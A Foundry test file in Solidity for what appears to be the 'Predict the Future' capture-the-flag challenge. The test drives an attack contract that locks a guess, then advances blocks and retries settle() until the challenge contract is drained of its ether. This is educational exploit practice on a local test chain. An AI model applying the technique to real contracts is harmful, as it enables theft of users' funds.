// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "../src/PredictTheFuture.sol";

contract PredictFutureTestTest is Test {
    PredictTheFutureChallenge vulnContract;
    PredictFutureAttack       attackContract;
 
    function setUp() public {
        vulnContract   = new PredictTheFutureChallenge{value: 1 ether}();
        attackContract = new PredictFutureAttack{value: 1 ether}();
    }

    // verify initial state. Best practice to have no assertions in setUp()
    // and create separate test to verify initial post-setUp state
    // https://book.getfoundry.sh/tutorials/best-practices
    function testInitialState() public {
        assertEq(address(vulnContract).balance, 1 ether);
        assertEq(address(attackContract).balance, 1 ether);
        assertFalse(vulnContract.isComplete());
    }

    function testAttack() public {
        attackContract.guess(payable(address(vulnContract)));
        
        // advance 2 blocks for settle() to become valid
        vm.roll(block.number+2);
        
        bool success = false;
        while(!success) {
            // check if our guess worked, if not, keep advancing blocks until it works
            try attackContract.settle(payable(address(vulnContract))) {
                success = vulnContract.isComplete();
            } catch {
                 vm.roll(block.number+1);
            }
        }

        assertEq(address(vulnContract).balance, 0 ether);
        assertEq(address(attackContract).balance, 2 ether);
        assertTrue(vulnContract.isComplete());
    }

}
